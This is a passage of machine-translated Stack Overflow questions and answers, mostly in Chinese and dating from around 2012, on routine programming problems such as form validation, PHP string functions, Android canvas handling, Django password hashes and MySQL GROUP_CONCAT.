You can simplify all those `document.forms[0].blah.value == ""` into: (using jQuery)

```
$("form > fieldset > input").each(function(){
    (this.value == "") && (errors += $(this).before().html() + "\n")
}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-01-27T14:15:34.367

我刚刚验证了您的代码的两个 ![在此处输入图像描述](../Images/d5f35846f43e4eb8fb37f2e738f3df9e.png) 字段 ![在此处输入图像描述](../Images/633e2d97e6da1b86285307a5c442d791.png)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-01-27T14:36:12.800

```
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
 <link rel="stylesheet" href="decor.css" type="text/css">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>jons viladating</title>
<script type="text/javascript">
function showjonsForm(form) 
  {
    if(form.fname.value=="")
    {
        alert("Please Enter your First Name..");
        form.fname.focus();
        return false;
    }

    if(form.lname.value=="")
    {  
        alert("Please Enter your Last Name..");
        form.lname.focus();
        return false;
    }

}

</script> 
```

```
 <body>

<h1>jons validations test</h1>
<form name="jon"  action="#" onsubmit="return showjonsForm(this)"      Method="post">
 <fieldset style="width:250px">
<label> first name</label> <input type="text" name="fname" size="15" maxlength="22"    onBlur="checkRequired( this,'fname')"/><br />
<label>last name</label> <input type="text" name="lname" size="10" maxlength="22">  <br />
 </fieldset>
<input type="submit"/></form>
  </body>

</html> 
```

最后我可以给你代码:)

# iphone - 如何在电子邮件正文中的某些文本之后设置第一个图像？

> ID：10069158
> 
> 赞同：2
> 
> 时间：2012-04-09T05:11:33.503
> 
> 标签：iphone, objective-c, cocoa-touch, ios4, mfmailcomposeviewcontroller

我正在使用 MFMailComposeViewController 发送电子邮件，

使用此代码，我可以获得图像，但图像出现在文本详细信息之后，我不想第一个图像和文本之后，

这是我的代码，

```
 MFMailComposeViewController *mail = [[MFMailComposeViewController alloc] init];
    mail.mailComposeDelegate = self;

    if ([MFMailComposeViewController canSendMail]) {
        //Setting up the Subject, recipients, and message body.
        [mail setToRecipients:[NSArray arrayWithObjects:Emailid,nil]];
        [mail setSubject:@"Receipt"];

        NSData *photoData = UIImageJPEGRepresentation([UIImage imageNamed:@"Gift.png"], 1);
        [mail addAttachmentData:photoData mimeType:@"image/jpg" fileName:[NSString stringWithFormat:@"photo.png"]];

        [mail setMessageBody:@"Receipt" isHTML:NO];
        NSString *emailBody;

        emailBody = [NSString stringWithFormat:@
                     "<br>Purchase Amount:            </br> "      "$  %@"
                     "<br>Amount Received:        </br> "      "$  %@"
                     "<br>Change:    </br> "      "$  %@"
                     ,AmountData,txtAmount.text,ChangeAmount.text];  

        [mail setMessageBody:emailBody isHTML:YES]; 
```

请任何机构建议我我该怎么做？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-09T05:28:06.257

据我所知，这是 mfmailcomposeviewcontroller 的默认行为，而不仅仅是将图像添加为附件，您可以如下所示首先显示图像以创建正文部分

```
(void)createEmail {

NSMutableString *emailBody = [[[NSMutableString alloc] initWithString:@"<html><body>"] retain];
   [emailBody appendString:@"<p>Some email body text can go here</p>"];
   UIImage *emailImage = [UIImage imageNamed:@"myImageName.png"];
   NSData *imageData = [NSData dataWithData:UIImagePNGRepresentation(emailImage)];

   NSString *base64String = [imageData base64EncodedString];
  [emailBody appendString:[NSString stringWithFormat:@"<p><b><img src='data:image/png;base64,%@'></b></p>",base64String]];
  [emailBody appendString:@"</body></html>"];
    NSLog(@"%@",emailBody);

 //mail composer window
    MFMailComposeViewController *emailDialog = [[MFMailComposeViewController alloc] init];
    emailDialog.mailComposeDelegate = self;
    [emailDialog setSubject:@"My Inline Image Document"];
    [emailDialog setMessageBody:emailBody isHTML:YES];

    [self presentModalViewController:emailDialog animated:YES];
    [emailDialog release];
    [emailBody release];
} 
```

这显示[在这里](http://www.roseindia.net/answers/viewqa/Mobile-Applications/20037-MFMailComposeViewController-image-attachment.html)

# php - join() PHP 函数删除重复值？

> ID：10069161
> 
> 赞同：0
> 
> 时间：2012-04-09T05:11:53.893
> 
> 标签：php, function, join, duplicates

你好吗？当我在数组中使用带有重复值的 join() 函数时，join 函数返回数组但删除重复项，我不希望这样！

例子：

```
$array= array(1, 2, 2, 2);
$res = join(',', $array); 
```

我明白了：

```
1,2 
```

但我希望结果是：

```
1,2,2,2 
```

希望可以有人帮帮我！谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T05:14:25.247

使用[implode](http://us2.php.net/implode "文档")：`implode(',', $array)`尽管 join 只是 implode 的别名，但它是正确使用的函数

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T05:48:57.367

你说这是你的代码：

```
while ($coordenada = mysql_fetch_assoc($resultado)) {
    $arrayX[$coordenada['ARTICULO']] = $coordenada['ARTICULO'];       
    $arrayY[$coordenada['CANTIDAD']] = $coordenada['CANTIDAD']; 
} 
```

在这种情况下，您不会像您想的那样填充数组。您的代码正在执行此操作：

```
$arrayY[1] = 1;
$arrayY[2] = 2;
$arrayY[2] = 2;
$arrayY[2] = 2; 
```

所以只包含2个值。如果您想要重复，请将您的代码更改为：

```
while ($coordenada = mysql_fetch_assoc($resultado)) {
    $arrayX[] = $coordenada['ARTICULO'];          
    $arrayY[] = $coordenada['CANTIDAD']; 
} 
```

# python - 密码存储为 sha1 和 pbkdf2_sha256

> ID：10069167
> 
> 赞同：3
> 
> 时间：2012-04-09T05:12:25.653
> 
> 标签：python, django

我有一个 django`auth_user`表，出于某种原因，一些密码是 store as`sha1$...`和 others `pbkdf2_sha256$...`。我没有看到任何押韵或理由——这两者之间有什么区别，为什么有些会作为一个版本存储，而另一些会作为另一个版本存储？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T05:15:10.147

您是否在保留用户数据的同时从 Django 1.3 升级到 Django 1.4？Django 1.4 引入了更新、更安全的密码存储哈希，但据我所知，它仍应与旧哈希向后兼容。

# javascript - Android画布冻结

> ID：10069170
> 
> 赞同：5
> 
> 时间：2012-04-09T05:12:45.140
> 
> 标签：javascript, android, canvas

我有一个在画布中运行的 javascript 应用程序。它适用于android，除了当你用手指在屏幕上拖动时，整个网页都会冻结。有没有办法阻止这种情况发生？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T07:03:15.677

您提出问题的方式并没有显示出非常丰富的信息。

Web 应用程序在获取 android 的全部功能方面存在一些限制。

您的陈述**我有一个在画布中运行的 javascript 应用程序，**乍一看 似乎您在应用程序中使用了 android 画布。

这是[链接](http://j-query.blogspot.in/2010/11/android-html5-canvas-mashup.html)

这可以帮助您在 android 中运行 html5 canvas

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-16T14:58:49.550

这取决于您在 a`MotionEvent.ACTION_DOWN`和 MOVE 上的代码中执行的操作......您应该有一些例程绘制画布。该例程不应被任何其他例程打断。

不确定这是否可以解决您的问题或提供任何见解，但这里有；

例如;

```
 protected void onDraw(Canvas canvas) {
  // fills the canvas with black
  canvas.drawColor(Color.BLACK);
  // draw some stuff on it
  backGnd.draw(canvas);  
  basket.draw(canvas);
  for (int i = 0; i < AppleList.size();i++){
      AppleList.get(i).draw(canvas);
  }  
 } 
```

运动事件将按如下方式处理（注意代码中的注释！）；

```
 @Override
 public boolean onTouchEvent(MotionEvent event) {

 if (!isTouchDisabled){
      if (event.getAction() == MotionEvent.ACTION_DOWN) {

        // add code to pass the action down to the objects
           basket.handleActionDown((int)event.getX(), (int)event.getY());
          }

          if (event.getAction() == MotionEvent.ACTION_MOVE) {
           // the gestures

        // only pass the move events to the objects that were previously touched (so action down entails checking for
        // the location of the touch AND the object.. if they match, you set isTouched to true.

        if (basket.isTouched()) {
            // the basket was picked up and is being dragged
            basket.setX((int)event.getX());
            basket.setY((int)event.getY());

           }
          }

          if (event.getAction() == MotionEvent.ACTION_UP) {
           // Check buttons
              if (btnMoreFruit.isTouched()){
                  btnMoreFruit.handleActionUp((int) event.getX(), (int) event.getY());
                  btnMoreFruit.setTouched(false);
              }
              if (btnLessFruit.isTouched()){
                  btnLessFruit.handleActionUp(this.getContext(), (int)event.getX(), (int)event.getY());
                  btnLessFruit.setTouched(false);
              }

          }
 } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T06:06:58.597

根据您在代码中的内容，当有人在画布上拖动手指（或鼠标）时，可能会发生大量处理。例如，在绘画应用程序中，每次更改像素时都会捕获用户焦点的 XY 位置。如果每个这些微小事件中的代码都不轻，客户端将在尝试赶上时挂起。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-09T17:52:55.760

Android 在处理画布和 javascript 方面非常糟糕。可能这就是它也冻结的原因。

[http://www.youtube.com/watch?v=yDrPNXnH-rg](http://www.youtube.com/watch?v=yDrPNXnH-rg)

# javascript - Canvas - 使用 HTML5/CSS/JS 更改图像的颜色？

> ID：10069171
> 
> 赞同：9
> 
> 时间：2012-04-09T05:12:45.840
> 
> 标签：javascript, css, html, canvas, html5-canvas

有没有办法像在 Flash/ActionScript 中一样仅使用 HTML5/CSS/JavaScript 来更改图像的颜色？

这是 Flash 中的一个示例：[http ://www.kirupa.com/developer/actionscript/color.htm](http://www.kirupa.com/developer/actionscript/color.htm) **: //www.kirupa.com/developer/actionscript/color.htm 编辑：这是我希望复制的过程。**

我正在尝试完成这样的事情（颜色变化方面，保留照明和阴影）：[http:](http://www.acura.com/ExteriorColor.aspx?model=TL) //www.acura.com/ExteriorColor.aspx?model= TL 无需每次都加载和替换新图像；我希望能够简单地改变色调（即做一个纯 HTML5/CSS/JS 方法）。**编辑：这是我希望达到的结果，而不是过程。**

基本上我想改变图像的调色板/色调，同时保留图像的其他方面（如渐变、照明等）。我已经接近了，但还不够接近；我已经到了使用图像蒙版并将其合成到原始图像上的地步（有点像透明图像叠加）。下面是一些示例代码（请注意，这只是一个片段，因此它可能有效也可能无效；我只显示示例代码，以便您了解我正在尝试做什么）：

```
<div id='mask'>
    <canvas id='canvas' width='100' height='100'></canvas>
</div>
<button data-rgba='255,0,0,0.5'>red</button>
<button data-rgba='0,255,0,0.5'>green</button>

<script>
foo = {};
foo.ctx = jQuery('#canvas')[0];
foo.ctx_context = foo.ctx.getContext('2d');
foo.mask = jQuery('#mask')[0];
foo.img = new Image();
foo.img_path = '/path/to/image_mask.png'; // 100px x 100px image

foo.changeColor = function(rgba){
    foo.ctx_context.clearRect(0, 0, 100, 100);
    foo.ctx_context.fillStyle = 'rgba(' + rgba + ')';
    foo.ctx_context.fillRect(0, 0, 100, 100);
    foo.ctx_context.globalCompositeOperation = 'destination-atop';
    foo.ctx_context.drawImage(foo.img, 0, 0);
    foo.ctx_context.css({'background-image': "url(" + foo.ctx.toDataURL("image/png") + ")"});
};

jQuery("button").click(function(){
    foo.changeColor(jQuery(this).attr('data-rgba'));
});
</script> 
```

使用这种方法的主要问题是图像看起来非常平坦。缺少其他东西，或者我正在使用的蒙版（这是一个纯白色不规则形状的图像）是错误的方法。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-15T15:59:51.387

此功能需要加载图像并且它必须来自同一个域（由于跨域策略）

```
function tintImage(imgElement,tintColor) {
    // create hidden canvas (using image dimensions)
    var canvas = document.createElement("canvas");
    canvas.width = imgElement.offsetWidth;
    canvas.height = imgElement.offsetHeight;

    var ctx = canvas.getContext("2d");
    ctx.drawImage(imgElement,0,0);

    var map = ctx.getImageData(0,0,320,240);
    var imdata = map.data;

    // convert image to grayscale
    var r,g,b,avg;
    for(var p = 0, len = imdata.length; p < len; p+=4) {
        r = imdata[p]
        g = imdata[p+1];
        b = imdata[p+2];
        // alpha channel (p+3) is ignored           

        avg = Math.floor((r+g+b)/3);

        imdata[p] = imdata[p+1] = imdata[p+2] = avg;
    }

    ctx.putImageData(map,0,0);

    // overlay filled rectangle using lighter composition
    ctx.globalCompositeOperation = "lighter";
    ctx.globalAlpha = 0.5;
    ctx.fillStyle=tintColor;
    ctx.fillRect(0,0,canvas.width,canvas.height);

    // replace image source with canvas data
    imgElement.src = canvas.toDataURL();
} 
```

假设您的标记如下所示：

```
<img id='myimage' src='image.jpg'/> 
```

您可以通过使用以下参数调用它来使用它：

```
tintImage(
    document.getElementById('myImage'),
    "#550000" // for a redish tint
); 
```

这里的工作示例：http: [//jsfiddle.net/pHwmL/1/](http://jsfiddle.net/pHwmL/1/)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-09T16:36:03.803

当然，您可以获取像素数据，并对其进行 HSV 调整。你想要的方法是getImageData（它返回一个UInt8Array，而不是一个普通的js数组）。

[这里](http://www.html5rocks.com/en/tutorials/canvas/imagefilters/)有一篇不错的文章，应该可以帮助您入门。您可以将透明画布元素叠加在一起，这将有助于避免调整基础组件（在您的汽车示例中，轮胎、窗户等）时出现问题。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2012-04-09T06:21:11.603

Usually doing something like change an image pixel by pixel is something you'd do on the server side, since it's very heavy for the browser. In the case of the Acura website there's nothing tricky going on - they just have a bunch of different JPGs. You could also try looking into Processing.js.

# linux - How to compile 64-bit file linking with 32-bit library

> ID：10069177
> 
> 赞同：0
> 
> 时间：2012-04-09T05:13:42.787
> 
> 标签：linux, 64-bit, 32-bit

My system is Centos 5.8 64-bit, and I want to compile a file linking with 32-bit library. I add -m32 while compiling, but the result shows "i386:x86-64 architecture of input file `gc_basic_call_model_voice_video_3g_cnf_nbup.o' is incompatible with i386 output". It seems that the file can't be compiled on 32-bit. But if I don't add -m32, the library can't be compiled. How to compile the file successfully, thanks!

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-09T05:19:19.053

您不能在同一个程序中混合使用 32 位和 64 位代码。编译器告诉您，您的`.o`文件之一被编译为 64 位对象，因此无法链接到 32 位可执行文件。您需要从用于所有内容的源代码重新编译该目标文件，可能还有其他文件`-m32`。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2016-11-02T20:43:30.357

假设您以下列方式编译了程序的 32 位版本（我们称之为 foo.c）：

```
gcc -m32 -c foo.c -o foo.o 
```

然后，您应该使用 -melf_i386 标志在其上调用链接器。

```
ld <whatever commands / flags you gave earlier> -melf_i386 
```

例子 ：

```
ld -o foo.bin --oformat binary basic.o -melf_i386 
```

# hsqldb - Liquibase and migrating from HSQL 1.8.0.x to HSQL 2.2.8 can't drop column

> ID：10069178
> 
> 赞同：0
> 
> 时间：2012-04-09T05:13:46.700
> 
> 标签：hsqldb, liquibase

I've been running Liquibase for both mySQL (for the real stuff) and HSQLDB (for testing). I recently had to update our Hibernate version, which required me to update our HSQLDB version to 2.x.x - I went with the latest. Now I have at least one changeset that was running fine before, but now gives me:

> Error executing SQL ALTER TABLE app_user DROP COLUMN name: column is referenced in: PUBLIC.SYS_CT_10302 in statement [ALTER TABLE app_user DROP COLUMN name]

The column "name" does have a unique constraint on it (along with another column) at the time it is being dropped, so I suspect that is the problem. However, the unique constraint doesn't have a name, so I haven't had any success dropping it first, either.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T11:50:45.983

您可以通过查询 INFORMATION_SCHEMA 找到 UNIQUE 约束的名称：

```
SELECT CONSTRAINT_NAME FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE WHERE COLUMN_NAME = 'NAME' AND TABLE_NAME = 'APP_USER'

ALTER TABLE APP_USER DROP CONSTRAINT ... 
```

或者，您可以将该列连同使用它的任何约束一起删除：

```
ALTER TABLE APP_USER DROP COLUMN NAME CASCADE 
```

# jsf - 需要关于实现 JSF ResourceHandler 的教程

> ID：10069181
> 
> 赞同：0
> 
> 时间：2012-04-09T05:14:19.830
> 
> 标签：jsf, jsf-2

我的应用程序需要实现动态图像，浏览器可以从我的数据库中获取 JPG 或 PNG。

我一直在[阅读这个帖子](https://stackoverflow.com/questions/9546101/own-resourcehandler-to-stream-images-from-db)，并且在学习方面并没有走得太远。有人可以提供有关如何实现 ResourceHandler 的教程的链接。

浏览了亚马逊提供的关于 JSF 2.0 的所有书籍，似乎没有一本涵盖这个主题。提前致谢。

更新：这个问题被撤回，因为我采取了不同的解决方案路径，它只是实现一个 Servlet 来提供图像。我要问的是如何让 JSF Facelets Servlet 响应带有“image/png”媒体类型的 GET。尽管您似乎可以通过 ResourceHandler 工具来做到这一点，但我发现实现 Servlet 更容易，而且您在资源路径名称方面具有更大的灵活性。

令我惊讶的是，尽管 Servlet 在处理请求时没有 FacesContext，但您可以注入 CDI 管理的 bean 或资源。这使我可以像应用程序的其余部分一样访问 JPA 后端。所以我的问题解决了。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-09T06:00:43.403

以下是不同方法的几个链接：

[来自数据库的 JSF graphicsImage - 扩展资源](http://digitaljoel.nerd-herders.com/2010/09/12/jsf-graphicimage-from-database/)

[从数据库服务的 ImageServlet](http://balusc.blogspot.com/2007/04/imageservlet.html#ImageServletServingFromDatabase)

[PrimeFaces - 使用 JSF 的动态图像](http://cagataycivici.wordpress.com/2009/11/02/dynamic-images-with-jsf/)

# google-app-engine - 使用 Google Apps Engine 的外部 SMTP 服务器/服务

> ID：10069183
> 
> 赞同：0
> 
> 时间：2012-04-09T05:14:37.057
> 
> 标签：google-app-engine, email, smtp

我有一个发送电子邮件的简单 Google Apps Engine 应用程序，但我不想使用 GAE SMTP 网关，我想使用外部网关。如果我不能明确指定我的网关（即 smtp.myservice.com:587），我可以选择通过 JSON 或 CURL 的 SMTP 代理中继。截至 2010 年，这是不可能的。（[这里的问题](https://stackoverflow.com/questions/4000748/can-google-app-engine-use-a-third-party-smtp-server)）。

是否有人对 GAE 或 GAE 支持的任何 Web 框架是否公开外部 SMTP 网关/服务器有更新？如果没有，我可以使用 SMTP 代理中继服务将电子邮件发送到我的 SMTP 网关吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T04:35:05.520

App Engine 应用程序无法创建任意传出套接字连接，这就是它们无法将邮件直接发送到 SMTP 服务器的原因。这在 2010 年是正确的，今天仍然如此。

我不知道那里有任何 HTTP-> SMTP 网关。运行服务是有问题的，因为您必须担心垃圾邮件发送者；您不太可能找到比 App Engine 的电子邮件解决方案更便宜或更易于使用的可靠服务。

如果您真的不想使用 App Engine 的邮件发送服务，您最好的选择可能是启动您自己的私有网关并使用它发送您的电子邮件。

# java - 在 for 循环中返回不评估迭代器中的所有条目

> ID：10069184
> 
> 赞同：0
> 
> 时间：2012-04-09T05:14:46.093
> 
> 标签：java

我在java中遇到了for循环的问题。我正在尝试进行迭代深度搜索，在深度 n 处生成子级的代码如下所示：

```
for(Iterator<puzzleBoard> child = generateSuccessorsIDS(pb).iterator(); child.hasNext();){
    DLS(child.next(),(depth-1));
} 
```

当不使用 return 语句时，DLS 确实喜欢它应该做的，但是由于缺少 return 语句，值没有到达调用函数。使用 return DLS(...) 时，它只返回迭代器生成的第一个值。如何解决这个问题？我粘贴了整个 DLS，它是下面的调用者函数。

```
private puzzleBoard IDS(String initial){
    puzzleBoard pb = new puzzleBoard(initial,0,new Vector<Integer>(),new Vector<puzzleBoard>(),new Vector<puzzleBoard>());

    puzzleBoard result=new puzzleBoard("999999999",0,new Vector<Integer>(),new Vector<puzzleBoard>(),new Vector<puzzleBoard>());
    for(int depth=0;depth<3;depth++){//Repeat
        System.out.println("DP "+depth);
        result = DLS(pb,depth);
        System.out.println("Here: "+result.toString());
        if(result.isGoalState())
            return result;
    }
    return new puzzleBoard("999999999",0,new Vector<Integer>());
}

private puzzleBoard DLS(puzzleBoard pb, int depth){

    pb.printPuzzle();
    if(depth==0 && pb.isGoalState()){
        System.out.println("!!!!!WOOOOOW!!!!!");
        return pb;
    }
    else if(depth>0){
        for(Iterator<puzzleBoard> child = generateSuccessorsIDS(pb).iterator(); child.hasNext();){
            DLS(child.next(),(depth-1));
        }
    }
    else
        return new puzzleBoard("999999999",0,new Vector<Integer>(),new Vector<puzzleBoard>(),new Vector<puzzleBoard>());
    return pb;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-09T05:23:21.173

可能是我错了，但我认为你应该把你的 for 循环放在外面，你实际上`DLS(puzzleBoard pb, int depth)`是第一次调用你的函数.....在你`else if`唯一的调用 里面`DLS(pb,depth);`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-09T05:48:26.993

您正在遍历迭代器中的每个元素并调用每个元素`DLS`，但是您返回为循环内的第一个元素调用它的结果，绕过所有其他元素。您需要决定如何组合`DLS`循环中所有调用的返回值。

如果您只想`null`在调用`DLS`每个元素后返回，`return`请在循环后添加一条语句。

```
else if (depth>0) {
    for (...) {
        DLS(...);
    }
    return null;
} 
```

# php - 如何防止替换字符变成 PHP 中的 html 实体？

> ID：10069193
> 
> 赞同：1
> 
> 时间：2012-04-09T05:15:43.777
> 
> 标签：php, mysql, decode

我正在处理 MySQL 数据库中的[替换字符](http://www.fileformat.info/info/unicode/char/fffd/index.htm)......如果它留在那里很好，但我正在尝试编辑它。我的表单将字符显示为带有问号 (�) 的菱形。所以我提交了表单，我比较了表单上的数据和数据中的数据，看看它是否发生了变化。这里的问题是，当我提交表单时，它会将替换字符变成**&** **#65533;**这是 html 实体等价物，所以当发生这种情况时，比较失败，代码认为字符串已经改变——它有，但不是真的。我尝试使用不同的方法，在比较时将替换字符转换为数据库中的 html 实体等价物——它开始将另一个看似正常的字符变成另一个替换字符 html 实体等价物——然后将 html 实体进入替换字符——这根本不起作用——但它们都失败了。是的，我已经尝试过 html_entity_decode() 和 htmlspecialchars_decode()

我的问题是：如何防止替换字符变成 html 实体？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:28:31.387

请验证您的 html 上的编码（例如）

```
<meta http-equiv="Content-Type" content="text/html; charset=<your_charset>"> 
```

并在您的数据库上（例如在 MySQL 中）

```
DEFAULT CHARACTER SET <your_charset> COLLATE <your_collate> 
```

它必须相等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T14:35:48.927

出于某种原因，网络浏览器正在提交 � REPLACEMENT CHARACTER (U+FFFD)，因为它是十进制的数字 HTML 实体：`&#65533;`。可能您已经以这种方式将其输出到浏览器？

但是，如果您希望输入包含 HTML 实体，如果您不想将它们作为 HTML 存储到数据库中，则需要对它们进行解码。要解码传入的 UTF-8 编码字符串中的数字实体`$str`：

```
$convmap = array (0, 0x10FFFF, 0, 0xFFFFFF);
$output = mb_decode_numericentity($str, $convmap, 'UTF-8'); 
```

此代码确实执行了您正在寻找的转换 ( [Demo](http://codepad.viper-7.com/mWIkeo) )，但是您应该首先澄清为什么要提交数字 HTML 实体。

由于您更喜欢 unicode，我建议您对网页使用 UTF-8：

```
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
```

对于形式：

```
<form action="" method="post" accept-charset="utf-8"> 
```

祝你好运。

# delphi - 链接两个独立的 MDB（访问数据库）文件，而不是表

> ID：10069196
> 
> 赞同：2
> 
> 时间：2012-04-09T05:16:07.727
> 
> 标签：delphi, ms-access

这有点类似于主从情况，但有一些变化。

问题：我有两个独立的 MS Access 数据库文件 (.mdb)，需要链接。

*   第一个数据库有零件编号、零件详细信息、供应商等...
*   第二个数据库将单独的零件编号作为表名，在这些表中是使用该零件的客户和产品编号。

我找不到合适的主从链接方法，主要是因为表格名称必须随着网格中单元格数据的更改/更新而即时更改。

因此，我想出了一种替代链接方法，如下所示。而且我不完全确定这是链接它们的好方法。

{DBGrid1 显示来自 ADOTable1 的值 } {DBGrid2 显示来自 ADOTable2 的值，其表名发生变化}

```
procedure TForm1.DBGrid1CellClick(Column: TColumn);
var PartTableName: string;
begin
if DBGrid1.Fields[2].IsNull then exit
  else
   begin
     if ADOTable2.active then ADOTable2.Close;
     PartTableName:= DBGrid1.Fields[2].AsString;
     while pos('-',TableString) > 0 do
       PartTableName[pos('-',PartTableName)] := '_';
     ADOTable2.TableName:= PartTableName;  //obtained from cell click in DBGrid1
     ADOTable2.Open;
   end;
end; 
```

DBGrid2 显示使用在 DBGrid1 中单击的任何部件号的客户和产品。

必须有更好的方法来做到这一点？这种链接方式对我来说似乎很粗糙。我也宁愿在 OnDataChange 方法中使用它，但似乎不起作用。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-09T07:23:16.087

您可以在 Access 中进行设置。这是一个比在 Delphi 中更强大的解决方案。

在您的 Access 版本中找到链接表管理器，它允许您将表从另一个数据库链接到您拥有的数据库中。然后，您可以使用 delphi 访问单个 mdb 并获取所有表。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-09T07:41:00.140

[TxQuery](http://code.google.com/p/txquery/)是您的另一个选择。

引用：

> **TxQuery**组件是一个 TDataSet 后代组件，可用于使用**SQL 语句查询****一个或多个 TDataSet 后代**组件。

 *** * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T23:59:18.267

我建议您不要重新查询，而是考虑使用 ADO 组件来过滤表的内容。这将大致相当于主从安排，并且具有仅执行“内存中”操作的优点，并且每次“主”行更改时都不会访问数据库。（在每个主行更改时，只需更改子表上的过滤条件）**

# ruby-on-rails-3 - 每当 cron 不使用 rails-3 时

> ID：10069197
> 
> 赞同：0
> 
> 时间：2012-04-09T05:16:09.263
> 
> 标签：ruby-on-rails-3, whenever

我第一次使用**无论何时**。我的 cron 无法在生产服务器上运行。

我正在使用 rails-3.1.2

**在我的 schedule.rb 文件中**

```
every :hour do # Many shortcuts available: :hour, :day, :month, :year, :reboot
  runner "Report.create_report", :environment=>"development"
end

every 2.minutes do
    runner "Report.create_report2" , :environment=>"development"
end 
```

**在我的报告模型文件中**

```
 def self.create_report
    r = Report.new
    r.ad_network_campaign_id =1
    r.ad_network_campaign_name=2
    r.save
  end

  def self.create_report2
    r = Report.new
    r.ad_network_campaign_id =5
    r.ad_network_campaign_name=5
    r.save
  end 
```

**在此之后我运行命令**

```
whenever --update-crontab <project_name> 
```

**在我的 crontab 中**

```
crontab -l
# Begin Whenever generated tasks for: project_name
0 * * * * /bin/bash -l -c 'cd /var/www/jigserv && script/rails runner -e production '\''Report.create_report'\'''

0,2,4,6,8,10,12,14,16,18,20,22,24,26,28,30,32,34,36,38,40,42,44,46,48,50,52,54,56,58 * * * * /bin/bash -l -c 'cd /var/www/jigserv && script/rails runner -e production '\''Report.create_report2'\'''

# End Whenever generated tasks for: project_name 
```

最后，我的数据没有按我的意愿插入到报告表中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-11T11:15:54.267

伙计，它完全脱离了主题，但在 Rails 3 中使用有很多问题`whenever`。我建议你迁移到[Resque](https://github.com/defunkt/resque)。它非常简单，而且比`whenever`. 这是相同的[resque-scheduler](https://github.com/bvandenbos/resque-scheduler)。[这](http://railscasts.com/episodes/271-resque)是一个可以帮助您入门的 railscasts。

# php - 使用 php decbin 函数

> ID：10069198
> 
> 赞同：1
> 
> 时间：2012-04-09T05:16:22.713
> 
> 标签：php

我是 php 新手。我想在 PHP 中询问 decbin 函数，
假设我有这段代码：

```
 <?php
    $input= 8;
    for($i=0;$i<$input ; $i++){  
     echo decbin($i)."<br>";
    }
 ?> 
```

那么输出将是这样的：

```
0 
1
10
11
100
101
110
111 
```

但我想让输出像这样

```
000
100
100
110
100
101
110
111 
```

有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-09T05:18:04.787

你使用 str_pad

```
echo str_pad(decbin($i), 3, '0') . '<br/>'; 
```

[http://sg.php.net/str_pad](http://sg.php.net/str_pad)

您的完整代码应如下所示：

```
 <?php
    $input= 8;
    for($i=0;$i<$input ; $i++){  
     echo str_pad(decbin($i), 3, '0') . '<br/>';
    }
 ?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:18:55.523

[str_pad](http://us2.php.net/manual/en/function.str-pad.php "表带")应该可以工作

`echo str_pad(decbin($i), 3 , '0'); // defaults to right padding`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-09T05:25:41.373

看看[str_pad() 函数](http://php.net/manual/en/function.str-pad.php)；这段代码对我来说很好：

```
<?php
    $input= 8;
    for($i=0;$i<$input ; $i++){  
        echo(str_pad(decbin($i),3,0).'<br />');
    }
?> 
```

# mysql - 将子查询结果合并为文本

> ID：10069199
> 
> 赞同：1
> 
> 时间：2012-04-09T05:16:27.923
> 
> 标签：mysql, subquery, aggregate-functions

**问题：**我想将子查询的结果合并为一个文本字段，结果用逗号（或任何符号）分隔到主查询的结果中。

**例子：**

*表格1：*

```
 +----------+---------+
 |  user_ID | user    |
 +----------+---------+
 |        1 |   Smith |
 +----------+---------+
 |        2 |   Jones |
 +----------+---------+ 
```

*表格1：*

```
 +----------+---------+
 |  user_ID | roles   |
 +----------+---------+
 |        1 |   Admin |
 +----------+---------+
 |        2 |   Staff |
 +----------+---------+
 |        2 |   Admin |
 +----------+---------+
 |        2 |   Super |
 +----------+---------+
 |        1 |   Other |
 +----------+---------+ 
```

**所以结果是：**

```
 +----------+---------+----------------------------+
 |  user_ID | user    |   roles                    |
 +----------+---------+----------------------------+
 |        1 |   Smith |    Admin, Other            |
 +----------+---------+----------------------------+
 |        2 |   Jones |    Staff, Admin, Super     |
 +----------+---------+----------------------------+ 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-09T05:28:10.250

试试这个：

```
select t1.user_id, t1.user, group_concat(t2.roles separator ', ') roles
from t1
join t2 on t1.user_id = t2.user_id
group by t1.user_id, t1.user 
```

查看[`GROUP_CONCAT`](http://dev.mysql.com/doc/refman/5.6/en/group-by-functions.html#function_group-concat)文档以获取更多信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-09T05:34:52.167

试试这个并告诉我它是否有帮助：

```
select a.user_id, a.user, group_concat(b.roles) as roles
from table1 as a
